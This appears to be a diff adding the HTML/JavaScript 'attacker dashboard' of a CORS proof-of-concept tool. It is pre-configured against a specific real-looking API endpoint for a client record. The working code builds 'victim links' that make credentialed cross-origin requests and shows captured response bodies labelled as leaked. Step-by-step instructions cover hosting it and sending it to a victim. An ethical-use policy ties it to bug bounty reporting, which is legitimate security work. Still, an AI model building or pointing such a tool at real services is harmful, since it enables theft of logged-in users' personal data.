@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CORS PoC Tool — Attacker Dashboard</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: #0d0d0d; color: #e0e0e0; font-family: 'Courier New', monospace; min-height: 100vh; padding: 2rem; }
+  h1 { font-size: 1.1rem; color: #ff4444; letter-spacing: 0.1em; margin-bottom: 0.3rem; }
+  .subtitle { font-size: 0.75rem; color: #555; margin-bottom: 2rem; }
+  label { font-size: 0.75rem; color: #888; display: block; margin-bottom: 0.4rem; letter-spacing: 0.05em; }
+  .input-row { display: flex; gap: 0.5rem; margin-bottom: 0.5rem; }
+  input[type="text"] {
+    background: #1a1a1a; border: 1px solid #2a2a2a; color: #e0e0e0;
+    padding: 0.6rem 0.8rem; font-family: 'Courier New', monospace;
+    font-size: 0.85rem; border-radius: 4px; flex: 1; outline: none;
+    transition: border-color 0.2s;
+  }
+  input[type="text"]:focus { border-color: #ff4444; }
+  select {
+    background: #1a1a1a; border: 1px solid #2a2a2a; color: #e0e0e0;
+    padding: 0.6rem 0.8rem; font-family: 'Courier New', monospace;
+    font-size: 0.85rem; border-radius: 4px; outline: none; cursor: pointer;
+  }
+  button {
+    background: #ff4444; border: none; color: #fff;
+    padding: 0.6rem 1.2rem; font-family: 'Courier New', monospace;
+    font-size: 0.85rem; border-radius: 4px; cursor: pointer;
+    transition: background 0.2s; white-space: nowrap;
+  }
+  button:hover { background: #cc2222; }
+  button.secondary {
+    background: #1a1a1a; border: 1px solid #2a2a2a; color: #888;
+  }
+  button.secondary:hover { background: #222; color: #ccc; }
+  .section { background: #111; border: 1px solid #1e1e1e; border-radius: 6px; padding: 1.2rem; margin-bottom: 1rem; }
+  .section-title { font-size: 0.7rem; color: #555; letter-spacing: 0.12em; margin-bottom: 1rem; text-transform: uppercase; }
+  .link-box {
+    background: #0d1a0d; border: 1px solid #1a3a1a; border-radius: 4px;
+    padding: 0.8rem; font-size: 0.8rem; color: #44ff88; word-break: break-all;
+    display: none; margin-top: 0.8rem; cursor: pointer; position: relative;
+  }
+  .link-box:hover { border-color: #44ff88; }
+  .copy-hint { position: absolute; right: 0.6rem; top: 50%; transform: translateY(-50%); font-size: 0.7rem; color: #44ff88; opacity: 0.6; }
+  .log { background: #080808; border: 1px solid #1a1a1a; border-radius: 4px; padding: 1rem; min-height: 200px; max-height: 400px; overflow-y: auto; font-size: 0.8rem; }
+  .log-entry { margin-bottom: 0.8rem; border-bottom: 1px solid #111; padding-bottom: 0.8rem; }
+  .log-entry:last-child { border-bottom: none; margin-bottom: 0; }
+  .log-time { color: #555; font-size: 0.7rem; margin-bottom: 0.3rem; }
+  .log-status { display: inline-block; padding: 2px 8px; border-radius: 3px; font-size: 0.7rem; font-weight: bold; margin-bottom: 0.5rem; }
+  .status-vuln { background: #3a0000; color: #ff4444; }
+  .status-blocked { background: #0d1a00; color: #44ff88; }
+  .status-waiting { background: #1a1a00; color: #ffaa00; }
+  .log-key { color: #888; font-size: 0.75rem; }
+  .log-val { color: #e0e0e0; font-size: 0.8rem; word-break: break-all; }
+  .log-val.danger { color: #ff4444; }
+  .log-val.safe { color: #44ff88; }
+  .log-data { background: #0a0a0a; border: 1px solid #1a1a1a; border-radius: 3px; padding: 0.6rem; margin-top: 0.5rem; color: #cccc44; font-size: 0.75rem; white-space: pre-wrap; word-break: break-all; max-height: 150px; overflow-y: auto; }
+  .empty-log { color: #333; font-size: 0.8rem; text-align: center; padding: 2rem; }
+  .tag-row { display: flex; gap: 0.4rem; flex-wrap: wrap; margin-top: 0.5rem; }
+  .tag { background: #1a1a1a; border: 1px solid #2a2a2a; padding: 2px 8px; border-radius: 3px; font-size: 0.7rem; color: #666; cursor: pointer; }
+  .tag:hover { border-color: #ff4444; color: #ff4444; }
+  .checkbox-row { display: flex; align-items: center; gap: 0.5rem; margin-top: 0.6rem; }
+  input[type="checkbox"] { accent-color: #ff4444; }
+  .checkbox-row label { margin: 0; font-size: 0.8rem; color: #888; cursor: pointer; }
+  .pulse { display: inline-block; width: 8px; height: 8px; border-radius: 50%; background: #ff4444; margin-right: 0.4rem; animation: pulse 1.5s infinite; }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
+  .listening-badge { font-size: 0.7rem; color: #44ff88; display: flex; align-items: center; }
+  hr { border: none; border-top: 1px solid #1a1a1a; margin: 1rem 0; }
+  .clear-btn { float: right; margin-top: -0.2rem; }
+</style>
+</head>
+<body>
+
+<h1>// CORS PoC Tool</h1>
+<p class="subtitle">bug bounty proof-of-concept generator — attacker dashboard</p>
+
+<div class="section">
+  <div class="section-title">01 — Target Configuration</div>
+
+  <label>TARGET ENDPOINT URL</label>
+  <input type="text" id="endpoint" placeholder="https://api.target.com/api/v1/users/me" value="https://gp11022025-api.superdrug.com/api/v1/clients/11028" />
+  <div class="tag-row">
+    <span class="tag" onclick="setEndpoint('https://gp11022025-api.superdrug.com/api/v1/clients/11028')">superdrug /clients</span>
+    <span class="tag" onclick="setEndpoint('')">+ custom</span>
+  </div>
+
+  <hr>
+
+  <label style="margin-top:0.8rem">REQUEST METHOD</label>
+  <select id="method">
+    <option value="GET">GET</option>
+    <option value="POST">POST</option>
+    <option value="PUT">PUT</option>
+    <option value="DELETE">DELETE</option>
+  </select>
+
+  <div class="checkbox-row">
+    <input type="checkbox" id="withCreds" checked />
+    <label for="withCreds">Include credentials (cookies / session tokens) — credentials: 'include'</label>
+  </div>
+
+  <hr>
+
+  <label>VICTIM REDIRECT URL (where victim lands after payload fires)</label>
+  <input type="text" id="redirectUrl" placeholder="https://google.com" value="https://google.com" />
+
+  <hr>
+
+  <div style="display:flex; gap:0.5rem; flex-wrap:wrap; margin-top:0.2rem">
+    <button onclick="generateLink()">Generate victim link</button>
+    <button class="secondary" onclick="clearLog()">Clear results</button>
+  </div>
+
+  <div class="link-box" id="linkBox" onclick="copyLink()">
+    <span id="linkText"></span>
+    <span class="copy-hint">click to copy</span>
+  </div>
+</div>
+
+<div class="section">
+  <div class="section-title" style="display:flex; justify-content:space-between; align-items:center">
+    <span>02 — Captured Data</span>
+    <span class="listening-badge"><span class="pulse"></span>listening</span>
+  </div>
+
+  <div class="log" id="log">
+    <div class="empty-log" id="emptyMsg">No data captured yet. Generate a victim link and open it in a new tab.</div>
+  </div>
+</div>
+
+<script>
+const channel = new BroadcastChannel('cors_poc_channel');
+const log = document.getElementById('log');
+const emptyMsg = document.getElementById('emptyMsg');
+let resultCount = 0;
+
+function setEndpoint(url){ document.getElementById('endpoint').value = url; }
+
+function generateLink(){
+  const endpoint = document.getElementById('endpoint').value.trim();
+  const method = document.getElementById('method').value;
+  const withCreds = document.getElementById('withCreds').checked;
+  const redirect = document.getElementById('redirectUrl').value.trim();
+
+  if(!endpoint){ alert('Enter a target endpoint URL first.'); return; }
+
+  const params = new URLSearchParams({
+    endpoint,
+    method,
+    creds: withCreds ? '1' : '0',
+    redirect: redirect || 'https://google.com'
+  });
+
+  const victimUrl = window.location.origin + window.location.pathname.replace('index.html','') + 'victim.html?' + params.toString();
+  const box = document.getElementById('linkBox');
+  document.getElementById('linkText').textContent = victimUrl;
+  box.style.display = 'block';
+}
+
+function copyLink(){
+  const text = document.getElementById('linkText').textContent;
+  navigator.clipboard.writeText(text).then(() => {
+    const hint = document.querySelector('.copy-hint');
+    hint.textContent = 'copied!';
+    setTimeout(()=>{ hint.textContent = 'click to copy'; }, 1500);
+  });
+}
+
+function clearLog(){
+  resultCount = 0;
+  log.innerHTML = '<div class="empty-log" id="emptyMsg">No data captured yet. Generate a victim link and open it in a new tab.</div>';
+}
+
+channel.onmessage = (event) => {
+  const data = event.data;
+  resultCount++;
+  const emptyEl = document.getElementById('emptyMsg');
+  if(emptyEl) emptyEl.remove();
+
+  const entry = document.createElement('div');
+  entry.className = 'log-entry';
+
+  const isVuln = data.vulnerable === true;
+  const timestamp = new Date(data.timestamp).toLocaleTimeString();
+
+  let headerRows = '';
+  if(data.headers){
+    for(const [k,v] of Object.entries(data.headers)){
+      const isDanger = k.toLowerCase().includes('access-control');
+      headerRows += `<div><span class="log-key">${k}: </span><span class="log-val ${isDanger ? 'danger':''}">${v}</span></div>`;
+    }
+  }
+
+  let dataBlock = '';
+  if(data.responseBody){
+    dataBlock = `<div style="margin-top:0.5rem"><div class="log-key" style="margin-bottom:0.3rem">LEAKED RESPONSE BODY:</div><div class="log-data">${escapeHtml(typeof data.responseBody === 'object' ? JSON.stringify(data.responseBody, null, 2) : data.responseBody)}</div></div>`;
+  }
+
+  entry.innerHTML = `
+    <div class="log-time">#${resultCount} — ${timestamp}</div>
+    <span class="log-status ${isVuln ? 'status-vuln' : 'status-blocked'}">${isVuln ? '⚠ VULNERABLE' : '✓ BLOCKED'}</span>
+    <div><span class="log-key">endpoint: </span><span class="log-val">${escapeHtml(data.endpoint || '')}</span></div>
+    <div><span class="log-key">method: </span><span class="log-val">${escapeHtml(data.method || 'GET')}</span></div>
+    <div><span class="log-key">credentials: </span><span class="log-val">${data.withCreds ? 'include' : 'omit'}</span></div>
+    <div><span class="log-key">http status: </span><span class="log-val">${data.status || 'N/A'}</span></div>
+    <div style="margin-top:0.5rem"><div class="log-key" style="margin-bottom:0.3rem">CORS HEADERS:</div>${headerRows || '<span class="log-val" style="color:#444">none returned</span>'}</div>
+    ${dataBlock}
+    <div style="margin-top:0.5rem"><span class="log-key">verdict: </span><span class="log-val ${isVuln ? 'danger' : 'safe'}">${data.verdict || ''}</span></div>
+  `;
+
+  log.insertBefore(entry, log.firstChild);
+};
+
+function escapeHtml(str){
+  return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+</script>
+
+<div class="section" style="margin-top:1rem">
+  <div class="section-title">03 — How to Use (Step by Step)</div>
+
+  <div style="display:flex; flex-direction:column; gap:1rem;">
+
+    <div style="display:flex; gap:1rem; align-items:flex-start;">
+      <div style="min-width:28px; height:28px; border-radius:50%; background:#1a1a1a; border:1px solid #ff4444; display:flex; align-items:center; justify-content:center; font-size:0.75rem; color:#ff4444; font-weight:bold;">1</div>
+      <div>
+        <div style="font-size:0.85rem; color:#ccc; margin-bottom:0.3rem;">Host on GitHub Pages</div>
+        <div style="font-size:0.75rem; color:#666; line-height:1.6;">Upload both <span style="color:#ffaa00">index.html</span> and <span style="color:#ffaa00">victim.html</span> to a GitHub repo. Go to Settings → Pages → set source to main branch. Your tool will be live at <span style="color:#44ff88">https://yourusername.github.io/reponame/</span></div>
+      </div>
+    </div>
+
+    <div style="display:flex; gap:1rem; align-items:flex-start;">
+      <div style="min-width:28px; height:28px; border-radius:50%; background:#1a1a1a; border:1px solid #ff4444; display:flex; align-items:center; justify-content:center; font-size:0.75rem; color:#ff4444; font-weight:bold;">2</div>
+      <div>
+        <div style="font-size:0.85rem; color:#ccc; margin-bottom:0.3rem;">Open the dashboard (this page)</div>
+        <div style="font-size:0.75rem; color:#666; line-height:1.6;">Navigate to your GitHub Pages URL. This is your attacker dashboard — it listens for data in real time.</div>
+      </div>
+    </div>
+
+    <div style="display:flex; gap:1rem; align-items:flex-start;">
+      <div style="min-width:28px; height:28px; border-radius:50%; background:#1a1a1a; border:1px solid #ff4444; display:flex; align-items:center; justify-content:center; font-size:0.75rem; color:#ff4444; font-weight:bold;">3</div>
+      <div>
+        <div style="font-size:0.85rem; color:#ccc; margin-bottom:0.3rem;">Configure your target</div>
+        <div style="font-size:0.75rem; color:#666; line-height:1.6;">Paste the vulnerable API endpoint URL. Set method to GET (most common for CORS leaks). Check <span style="color:#ffaa00">Include credentials</span> if the endpoint requires login. Set redirect to any site — victim lands there after payload fires.</div>
+      </div>
+    </div>
+
+    <div style="display:flex; gap:1rem; align-items:flex-start;">
+      <div style="min-width:28px; height:28px; border-radius:50%; background:#1a1a1a; border:1px solid #ff4444; display:flex; align-items:center; justify-content:center; font-size:0.75rem; color:#ff4444; font-weight:bold;">4</div>
+      <div>
+        <div style="font-size:0.85rem; color:#ccc; margin-bottom:0.3rem;">Generate the victim link</div>
+        <div style="font-size:0.75rem; color:#666; line-height:1.6;">Click <span style="color:#ff4444">Generate victim link</span>. This creates a unique URL pointing to <span style="color:#ffaa00">victim.html</span> with all parameters encoded. Click the green box to copy it.</div>
+      </div>
+    </div>
+
+    <div style="display:flex; gap:1rem; align-items:flex-start;">
+      <div style="min-width:28px; height:28px; border-radius:50%; background:#1a1a1a; border:1px solid #ff4444; display:flex; align-items:center; justify-content:center; font-size:0.75rem; color:#ff4444; font-weight:bold;">5</div>
+      <div>
+        <div style="font-size:0.85rem; color:#ccc; margin-bottom:0.3rem;">Simulate the victim (for PoC)</div>
+        <div style="font-size:0.75rem; color:#666; line-height:1.6;">While logged into the target site in the same browser, open the victim link in a <span style="color:#ffaa00">new tab</span>. The page fires the CORS request silently and redirects. Keep the dashboard tab open — data arrives automatically.</div>
+      </div>
+    </div>
+
+    <div style="display:flex; gap:1rem; align-items:flex-start;">
+      <div style="min-width:28px; height:28px; border-radius:50%; background:#1a1a1a; border:1px solid #ff4444; display:flex; align-items:center; justify-content:center; font-size:0.75rem; color:#ff4444; font-weight:bold;">6</div>
+      <div>
+        <div style="font-size:0.85rem; color:#ccc; margin-bottom:0.3rem;">Screen record and submit</div>
+        <div style="font-size:0.75rem; color:#666; line-height:1.6;">Record the full flow — dashboard open, victim link opened in new tab, data appearing in the Captured Data panel. This is your video PoC. Submit it with the report on Intigriti/HackerOne.</div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<div class="section" style="border-color:#1a2a1a; margin-top:1rem">
+  <div class="section-title" style="color:#44ff88">04 — Ethical Use Policy</div>
+  <div style="font-size:0.78rem; color:#556655; line-height:1.8;">
+    <p style="margin-bottom:0.8rem; color:#446644;">This tool is built exclusively for <strong style="color:#44ff88">bug bounty research and authorized security testing</strong>. By using it, you agree to the following:</p>
+    <div style="display:flex; flex-direction:column; gap:0.5rem;">
+      <div>✓ &nbsp;Only test endpoints on programs where you have <strong style="color:#88aa88">explicit written authorization</strong> — active bug bounty programs, your own infrastructure, or private scopes you are invited to.</div>
+      <div>✓ &nbsp;Do not use the victim link to target real users without their knowledge outside of a controlled PoC demo you run yourself.</div>
+      <div>✓ &nbsp;Do not use this tool to extract, store, or share real user PII beyond what is minimally necessary to demonstrate vulnerability impact in your report.</div>
+      <div>✓ &nbsp;Disclose all findings responsibly through the program's official channel — Intigriti, HackerOne, Bugcrowd, or direct vendor disclosure. Do not publish before a fix is deployed.</div>
+      <div>✓ &nbsp;Delete any captured sensitive data after your report is submitted and acknowledged.</div>
+      <div>✓ &nbsp;Unauthorized access to computer systems is illegal in most jurisdictions under laws including the Computer Fraud and Abuse Act (US), Computer Misuse Act (UK), and equivalent statutes worldwide. Misuse of this tool is entirely your legal responsibility.</div>
+    </div>
+    <p style="margin-top:0.8rem; color:#334433;">This tool performs no persistent storage, no external data exfiltration, and sends no data to any server. All communication happens locally in your browser via BroadcastChannel. The code is fully readable — audit it yourself.</p>
+  </div>
+</div>
+
+</body>
+</html>
